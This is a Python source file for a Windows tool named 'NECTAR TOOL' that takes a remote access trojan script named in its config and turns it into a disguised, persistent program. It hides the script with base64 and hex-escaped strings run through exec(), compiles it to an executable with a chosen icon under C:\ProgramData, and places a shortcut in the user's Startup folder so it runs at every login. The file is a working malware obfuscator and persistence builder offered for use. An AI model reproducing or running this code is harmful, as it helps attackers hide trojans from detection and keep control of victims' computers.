#os imports
from os import system as sys
from os import environ as env
from os import getcwd, remove 
from os import path as path_
#others imports
from json import load
from base64 import b64encode
from win32com.client import Dispatch
from plyer import notification as ntf
from pystyle import Colors, Write
from venv import create
from shutil import rmtree
#paths definitions 
startup_path = f"{env['appdata']}\Microsoft\Windows\Start Menu\Programs\Startup"
temp_path = env['TEMP']


sys(f"title NECTAR TOOL")

with open("config.json", "r") as f:
    config = load(f)

r="""=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~
║                                                          ║
]   ███╗   ██╗███████╗ ██████╗████████╗ ██████╗ ██████╗    [
║   ████╗  ██║██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗   ║
[   ██╔██╗ ██║█████╗  ██║        ██║   ████████║██████╔╝   ]
║   ██║╚██╗██║██╔══╝  ██║        ██║   ██╚╗  ██║██╔══██╗   ║
]   ██║ ╚████║███████╗╚██████╗   ██║   ╚██║ ██╔╝██║  ██║   [
║   ╚═╝  ╚═══╝╚══════╝ ╚═════╝   ╚═╝    ╚═╝ ╚═╝ ╚═╝  ╚═╝   ║
=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~ 
        crashixx||https://discord.io/H4X0R||shlemmmm\n"""


#error message
def error(x):
        ntf.notify(
            title='NECTAR',
            message=x,
            timeout=10
        )

#clear() command 
def clear():
    sys("cls")

#virtual env for cx_freeze creator 
def virtual_env():
    try:
        print("Building the virtual environment for CX_Freeze, please be patient..\n~=~=~=~=~=~=~=~=~")
        create("packages", system_site_packages=False, clear=False, symlinks=False, with_pip=True, prompt=None)
        sys(f"packages\\Scripts\\activate.bat")
        sys(f"packages\\Scripts\\pip.exe install cx_freeze")
        clear()
        print("~=~=~=~=~=~=~=~=~\nThe virtual environment for cx_freeze is ready, please be patient..")
    except:
        error("virtual env build")
        exit()

#file obfuscator
def obfuscator(f_content):
    OFFSET = 10
    VAR = '__SKID_OO' * 100
    try:
        b64_content = b64encode(f_content.encode()).decode()
        index = 0
        code = f'{VAR} = ""\n'
        for _ in range(int(len(b64_content) / OFFSET) + 1):
            _str = ''
            for char in b64_content[index:index + OFFSET]:
                byte = str(hex(ord(char)))[2:]
                if len(byte) < 2:
                    byte = '0' + byte
                _str += '\\x' + str(byte) 
            code += f'{VAR} += "{_str}"\n'
            index += OFFSET
        code += f'exec(__import__("\\x62\\x61\\x73\\x65\\x36\\x34").b64decode({VAR}.encode("\\x75\\x74\\x66\\x2d\\x38")).decode("\\x75\\x74\\x66\\x2d\\x38"))'
        return code
    except:
        error("Obfuscation error code: 1")
        pass

#obf file moover
def obf_file(base_path, sfname):
    try:
        with open(base_path, 'r', encoding='utf-8', errors='ignore') as file:
            f_content = file.read()
        obfuscated_content = obfuscator(f_content)
        
        with open(f"{sfname}-obf.py", 'w') as file:
            file.write(obfuscated_content)
    except Exception as e:
        input(e)
        error("Obfuscation error code: 2")
        exit()

#convert file (py) to exe

def exe(sfname, logopath):
    try:
        clear()
        print("EXE conversion using Cx_Freeze started, please be patient..\n~=~=~=~=~=~=~=~=~")
        rpath = r"C:\\ProgramData\\{}".format(sfname)
        file_cpath = getcwd() + f"\\{sfname}-obf.py"
        cx_cpath = getcwd() + f"\\packages\\Scripts\\cxfreeze.exe"
        path = f"{cx_cpath} {file_cpath}"
        sys(f"{path} --icon {logopath} --target-dir {rpath}")
        print("~=~=~=~=~=~=~=~=~\nEXE conversion complete !")

    except:
        error("Compiler error")
        exit()

#create shortcut in startup
def shortcut(x, app_name):
    try:
        shortcut_path = path_.join(x, f'{app_name}.lnk')
        target = f"C:\\ProgramData\\{app_name}\\{app_name}-obf.exe" 
        icon = f"C:\\ProgramData\\{app_name}\\{app_name}-obf.exe" 
        shell = Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = target
        shortcut.IconLocation = icon
        shortcut.save()
    except:
        error("shortcut error")
        exit()

#injector main
def injector(startup_path, base_path, sfname, logopath):
    obf_file(base_path, sfname)
    virtual_env()
    exe(sfname, logopath)
    shortcut(startup_path, sfname)
    remove(f"{sfname}-obf.py")
    rmtree(f"{getcwd()}\\packages")
    clear()
    Write.Input(f"""{r}> File succefuly created ! (C:\ProgramData\{sfname}\) 
> Shortcut succefuly created in startup folder !
> Done ;) !
Press enter to exit...""", Colors.red, interval=0)

#main code
def main():
    characters = "\',\""
    
    #file name set
    fname = f"{getcwd()}\\"+config["rat_name"]
    if fname=="":
        fname="Error"
        error("Invalid file name ")
        exit()         
    else: 
        pass
    
    #file base path set
    path = f"{getcwd()}"+config["rat_path"]
    try:
        if path=="":
            error("Invalid path")
            exit()
        else:
            base_path = ''.join( x for x in path if x not in characters)
    except:
        error("Set Path")
        exit()
    
    #logo path set 
    logo = f"{getcwd()}"+config["logo_path"]
    if logo == "":
        error("Invalid Logo")
        exit()
    else:
        logopath = ''.join( x for x in logo if x not in characters)

    #file infos verifications before convert and inject                                                                          
    Write.Input(f"""{r}\nFile Infos :
=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~
> File path: {base_path}
> Logo Path: {logopath}
> Final file name: {config["rat_name"]}.exe
> Final file path: C:\ProgramData\{config["rat_name"]}\\
> Final shortcut path: {startup_path}\{config['rat_name']}.lnk
=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~
Press enter to start the injection....""", Colors.red, interval=0)
    #injection starter
    try:
        sys("cls")
        sys("color C")
        injector(startup_path, base_path, config["rat_name"], logopath)
    except:
        sys("cls")
        Write.Input(f"{r}\nby H4X0R © | An Error was ocurred, Please try again...", Colors.red, interval=0)
        exit()

main()